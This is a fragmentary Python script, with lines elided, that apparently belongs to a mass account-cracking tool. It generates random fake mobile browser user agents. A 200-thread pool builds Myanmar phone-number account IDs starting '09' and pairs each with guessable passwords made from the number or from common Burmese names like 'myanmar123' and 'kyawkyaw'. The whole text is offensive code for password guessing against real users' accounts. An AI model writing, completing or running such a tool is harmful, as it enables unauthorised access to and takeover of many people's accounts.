...
#Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.62 Mobile/15E148 /15E148 Safari/604.1
...
#'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 115Browser/25.0.4.2'
#Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-R910) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2. Chrome/102.0.5005.125 Mobile Safari/537.36
#Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/97.0.4692.72 Mobile/15E148 Safari/604.1
...
for xd in range(10000):
    ...
    b=random.choice(['16_3','16_1','16_4','16_5','16_0','16_0','15_3','15_2','15_1','15_4','15_5','15_7','15_8','15_9','14_1','14_2','14_3','14_4','14_5','14_6','14_7','14_8','14_9','16_2'])
    k='TECNO KG5h'
    p=random.choice(['SM-R910','SM-R925F','SM-R900','SM-R875U','SM-R905N','SM-R920','SM-R925U','SM-R905U','SM-R915U'])
    c='like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'
    d=random.randrange(40, 166)
    e='0'
...
def phone():
    ...
    with ThreadPool(max_workers=200) as LEE:
        ...
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love,code+love[:4],love[1:],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','zawzaw','aungaung','chitchit','AungAung','KyawKyaw','ZawZaw']
